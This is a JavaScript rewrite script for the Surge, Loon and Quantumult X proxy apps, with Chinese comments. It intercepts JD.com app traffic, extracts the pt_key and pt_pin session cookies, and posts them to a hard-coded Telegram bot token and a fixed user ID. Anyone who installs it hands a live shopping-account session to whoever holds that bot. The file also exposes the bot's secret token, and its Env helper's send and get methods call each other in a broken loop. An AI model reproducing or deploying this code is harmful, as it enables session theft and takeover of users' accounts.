/**
 * 1、打开App，自动获取 pt_key 上传
 * 2、点击APP-个人中心，点消息，自动捕抓 pt_key 上传
 * 注：如有变更才会上传，如果 pt_key 没变，不会重复上传。

 */

/**
 * 京东CK上传脚本
 * 自动抓取并上传pt_key到Telegram
 */

const $ = new Env('京东CK上传');
const TGBotToken = '7317719510:AAG3qbEYQ5AYZqJX2GZJk-t4I0ov0IR-OPk';
const TGUserIDs = [7070580063];

// 主函数
(async () => {
    try {
        // 获取请求信息
        const url = $request.url;
        const headers = $request.headers;
        const body = $request.body;
        
        if (url.includes('mars.jd.com/log/sdk/v2')) {
            // 处理日志上报请求
            await handleLogRequest(url, headers, body);
        } else {
            // 处理普通请求中的Cookie
            await handleNormalRequest(headers);
        }
        
    } catch (error) {
        $.log(`脚本执行错误: ${error}`);
    }
})().finally(() => {
    $.done();
});

// 处理日志上报请求
async function handleLogRequest(url, headers, body) {
    $.log('检测到日志上报请求');
    
    // 从Cookie中提取pt_key和pt_pin
    const cookie = headers['Cookie'] || headers['cookie'];
    if (!cookie) {
        $.log('未找到Cookie');
        return;
    }
    
    const keyMatch = cookie.match(/pt_key=([^;]+)/);
    const pinMatch = cookie.match(/pt_pin=([^;]+)/);
    
    if (!keyMatch || !pinMatch) {
        $.log('未找到pt_key或pt_pin');
        return;
    }
    
    const pt_key = keyMatch[1];
    const pt_pin = pinMatch[1];
    const userName = decodeURIComponent(pt_pin);
    
    $.log(`找到账号: ${userName}`);
    
    // 检查是否需要更新
    const needUpdate = await checkAndUpdateCookie(pt_key, pt_pin, userName);
    
    if (needUpdate) {
        // 上传到Telegram
        await uploadToTelegram(pt_key, pt_pin, userName);
    }
}

// 处理普通请求
async function handleNormalRequest(headers) {
    const cookie = headers['Cookie'] || headers['cookie'];
    if (!cookie) {
        $.log('未找到Cookie');
        return;
    }
    
    const keyMatch = cookie.match(/pt_key=([^;]+)/);
    const pinMatch = cookie.match(/pt_pin=([^;]+)/);
    
    if (!keyMatch || !pinMatch) {
        $.log('未找到pt_key或pt_pin');
        return;
    }
    
    const pt_key = keyMatch[1];
    const pt_pin = pinMatch[1];
    const userName = decodeURIComponent(pt_pin);
    
    $.log(`从普通请求找到账号: ${userName}`);
    
    // 检查是否需要更新
    const needUpdate = await checkAndUpdateCookie(pt_key, pt_pin, userName);
    
    if (needUpdate) {
        await uploadToTelegram(pt_key, pt_pin, userName);
    }
}

// 检查并更新Cookie存储
async function checkAndUpdateCookie(pt_key, pt_pin, userName) {
    let cookiesData = JSON.parse($.getData('jd_cookies') || '[]');
    let needUpdate = false;
    let cookieIndex = -1;
    
    // 查找现有Cookie
    for (let i = 0; i < cookiesData.length; i++) {
        if (cookiesData[i].pt_pin === pt_pin) {
            cookieIndex = i;
            if (cookiesData[i].pt_key !== pt_key) {
                needUpdate = true;
                cookiesData[i].pt_key = pt_key;
                cookiesData[i].updateTime = new Date().getTime();
                $.log(`检测到pt_key更新: ${userName}`);
            }
            break;
        }
    }
    
    // 新Cookie
    if (cookieIndex === -1) {
        needUpdate = true;
        cookiesData.push({
            pt_key: pt_key,
            pt_pin: pt_pin,
            userName: userName,
            updateTime: new Date().getTime()
        });
        $.log(`新增Cookie: ${userName}`);
    }
    
    if (needUpdate) {
        $.setData(JSON.stringify(cookiesData), 'jd_cookies');
        $.log(`Cookie存储更新完成`);
    } else {
        $.log(`Cookie无需更新: ${userName}`);
    }
    
    return needUpdate;
}

// 上传到Telegram
async function uploadToTelegram(pt_key, pt_pin, userName) {
    const cookieStr = `pt_key=${pt_key};pt_pin=${pt_pin};`;
    const message = `🔔 京东账号CK更新通知

📱 账号: ${userName}
🕐 时间: ${new Date().toLocaleString('zh-CN')}

🔐 Cookie信息:
${cookieStr}

⚠️ 请妥善保管，勿泄露给他人`;

    for (const userId of TGUserIDs) {
        try {
            const result = await sendTelegramMessage(userId, message);
            if (result.ok) {
                $.log(`✅ Cookie已发送到用户 ${userId}`);
                $.msg('京东CK上传', `账号 ${userName}`, `Cookie已更新并发送`);
            } else {
                $.log(`❌ 发送失败: ${result.description}`);
            }
        } catch (error) {
            $.log(`❌ Telegram发送错误: ${error}`);
        }
    }
}

// 发送Telegram消息
function sendTelegramMessage(chatId, text) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TGBotToken}/sendMessage`;
        
        const options = {
            url: url,
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                disable_web_page_preview: true
            })
        };
        
        $.post(options, (error, response, body) => {
            if (error) {
                resolve({ok: false, description: error});
            } else {
                try {
                    const data = JSON.parse(body);
                    resolve(data);
                } catch (e) {
                    resolve({ok: false, description: '解析响应失败'});
                }
            }
        });
    });
}

// Env类 (Surge/Loon兼容)
function Env(name, opts) {
    class Http {
        constructor(env) {
            this.env = env;
        }

        send(opts, method = 'GET') {
            opts = typeof opts === 'string' ? { url: opts } : opts;
            let sender = this.get;
            if (method === 'POST') {
                sender = this.post;
            }
            return new Promise((resolve, reject) => {
                sender.call(this, opts, (err, resp, body) => {
                    if (err) reject(err);
                    else resolve(resp);
                });
            });
        }

        get(opts) {
            return this.send.call(this.env, opts);
        }

        post(opts) {
            return this.send.call(this.env, opts, 'POST');
        }
    }

    return new (class {
        constructor(name, opts) {
            this.name = name;
            this.http = new Http(this);
            this.data = null;
            this.logs = [];
            this.logSeparator = '\n';
            this.startTime = new Date().getTime();
            Object.assign(this, opts);
            this.log('', `🔔 ${this.name}, 开始!`);
        }

        isSurge() {
            return typeof $httpClient !== 'undefined';
        }

        isLoon() {
            return typeof $loon !== 'undefined';
        }

        isQuanX() {
            return typeof $task !== 'undefined';
        }

        getData(key) {
            if (this.isSurge() || this.isLoon()) {
                return $persistentStore.read(key);
            } else if (this.isQuanX()) {
                return $prefs.valueForKey(key);
            } else {
                return this.data[key];
            }
        }

        setData(val, key) {
            if (this.isSurge() || this.isLoon()) {
                return $persistentStore.write(val, key);
            } else if (this.isQuanX()) {
                return $prefs.setValueForKey(val, key);
            } else {
                this.data[key] = val;
                return true;
            }
        }

        msg(title, subtitle, body) {
            if (this.isSurge() || this.isLoon()) {
                $notification.post(title, subtitle, body);
            } else if (this.isQuanX()) {
                $notify(title, subtitle, body);
            }
            this.log(`${title}, ${subtitle}, ${body}`);
        }

        log(...args) {
            const logStr = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg) : arg
            ).join(' ');
            
            console.log(logStr);
            this.logs.push(logStr);
        }

        getval(key) {
            return this.getData(key);
        }

        setval(val, key) {
            return this.setData(val, key);
        }

        done(val = {}) {
            const endTime = new Date().getTime();
            const costTime = (endTime - this.startTime) / 1000;
            this.log('', `🔔 ${this.name}, 结束! 🕛 ${costTime} 秒`);
            
            if (this.isSurge() || this.isLoon()) {
                $done(val);
            } else if (this.isQuanX()) {
                $done(val);
            }
        }

        wait(time) {
            return new Promise(resolve => setTimeout(resolve, time));
        }
    })(name, opts);
}
